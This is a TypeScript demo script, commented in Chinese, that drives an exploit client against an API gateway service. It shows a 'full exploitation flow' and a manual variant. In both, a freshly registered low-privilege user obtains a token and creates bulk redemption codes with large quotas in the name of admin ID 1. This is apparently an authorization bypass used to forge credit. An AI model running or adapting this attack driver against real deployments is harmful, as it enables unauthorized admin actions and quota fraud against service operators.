import { NewApiClient } from '../src'

async function demo() {
  const client = new NewApiClient({
    baseURL: 'http://localhost:3000',
  })

  try {
    console.log('=== 示例 1: 快速获取 Token ===')
    const token = await client.quickGetToken('testuser', 'password123')
    console.log('Token:', token)

    console.log('\n=== 示例 2: 完整利用流程 ===')
    const codes = await client.exploit(
      'attacker', // 用户名
      'pass123', // 密码
      1, // 管理员 ID
      {
        name: '测试兑换码',
        count: 10,
        quota: 1000000,
        expired_time: 0,
      },
    )
    console.log('生成的兑换码:', codes)

    console.log('\n=== 示例 3: 手动控制流程 ===')
    await client.register({ username: 'manual', password: 'test' })
    await client.login({ username: 'manual', password: 'test' })
    const manualToken = await client.generateAccessToken()
    console.log('手动获取的 Token:', manualToken)

    const manualCodes = await client.createRedemption(1, {
      name: '手动创建',
      count: 5,
      quota: 500000,
      expired_time: 0,
    })
    console.log('手动创建的兑换码:', manualCodes)
  } catch (error) {
    console.error('错误:', error)
  }
}

// 运行示例
demo()
